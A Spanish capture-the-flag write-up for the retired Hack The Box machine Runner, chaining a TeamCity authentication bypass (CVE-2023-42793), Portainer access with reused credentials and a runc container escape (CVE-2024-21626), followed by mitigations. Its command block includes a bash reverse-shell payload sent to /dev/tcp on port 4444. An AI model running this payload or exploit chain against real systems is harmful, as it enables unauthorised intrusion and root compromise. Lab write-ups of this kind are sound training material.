---
machine: Runner
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, teamcity, portainer, runc, container-escape]
---

# Runner — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

TeamCity es vulnerable a CVE-2023-42793: un bypass de autenticación permite crear una build y ejecutar código. Las credenciales halladas dan acceso a Portainer; una imagen construida desde allí explota runc CVE-2024-21626 y escapa al host.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,8111 <IP>
curl -s http://runner.htb:8111/login.html | grep -i teamcity
# CVE-2023-42793
python3 teamcity_exploit.py -u http://runner.htb:8111 -c "bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'"
# Portainer
curl -k https://runner.htb:9443/api/endpoints
# runc CVE-2024-21626
docker build -t escape . && docker run --rm -it escape
```

## Enumeración

- TeamCity en `8111` con versión vulnerable.
- Portainer accesible con credenciales reutilizadas.
- La API de Portainer permite construir imágenes y ejecutar contenedores.

## Acceso inicial

El bypass de autenticación de TeamCity permite entrar como administrador, crear un proyecto y una build con un paso de línea de comandos. La build se ejecuta en el agente y devuelve una shell como el usuario de CI.

## Escalada de privilegios

Desde el host se accede a Portainer con las credenciales encontradas. Se construye una imagen con una ruta de trabajo manipulada y se explota la fuga de file descriptors de runc para escribir fuera del contenedor y ejecutar como root.

## Evidencia

- Bypass de TeamCity y build con callback.
- Acceso a Portainer y creación de imagen.
- `/proc/self/fd` apuntando al host y shell de root.

## Lecciones aprendidas

- Un servidor de CI es ejecución de código por diseño.
- Portainer con credenciales débiles amplifica el impacto.
- Un runtime de contenedores sin parche rompe el aislamiento.

## Mitigación y detección

- Actualizar TeamCity y exigir MFA.
- Restringir Portainer y usar tokens de corta duración.
- Actualizar runc y aplicar seccomp/AppArmor a los contenedores.

## Referencias

- [0xdf — Runner](https://0xdf.gitlab.io/2024/08/24/htb-runner.html)
- [NVD — CVE-2024-21626](https://nvd.nist.gov/vuln/detail/CVE-2024-21626)
- [Hack The Box — Runner](https://app.hackthebox.com/machines/runner)
